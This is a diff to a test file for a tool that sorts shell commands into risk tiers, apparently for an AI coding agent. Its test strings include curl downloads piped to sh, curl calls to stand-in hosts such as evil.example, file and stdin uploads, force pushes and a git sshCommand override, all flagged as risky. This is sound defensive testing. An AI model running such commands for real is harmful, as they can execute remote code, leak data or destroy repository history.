@@ -1374,6 +1374,14 @@ describe("TC-4.90 tuning of the honest-handoff tiers", () => {
 		asWarning("curl http://localhost:3000/x -o x && sh x");
 		asRisky("curl http://localhost:3000 http://evil.example/x");
 		asRisky("curl http://localhost:3000 evil.io/x");
+		asRisky("curl http://localhost:3000/x | sh");
+		asRisky("curl http://localhost:3000/x -o x && sh x");
+		// a second host the user typed is still a second host
+		expect(
+			say("curl http://localhost:3000 https://api.typed.test/x", {
+				urls: typed("use https://api.typed.test/x"),
+			}),
+		).toContain("risky_command");
 		asRisky("curl -d @- http://localhost:3000/x");
 		asRisky("curl -F f=@x localhost:3000/x");
 		asRisky("curl http://2130706433/x");
@@ -1445,7 +1453,7 @@ describe("TC-4.90 tuning of the honest-handoff tiers", () => {
 			"git push -uf origin main",
 			"git push --force-with-lease origin main",
 			"git push origin +main",
-			"git -c core.sshCommand=evil.sh push origin main",
+			"git -c core.sshCommand=wrap push origin main",
 		]) {
 			asRisky(c);
 		}
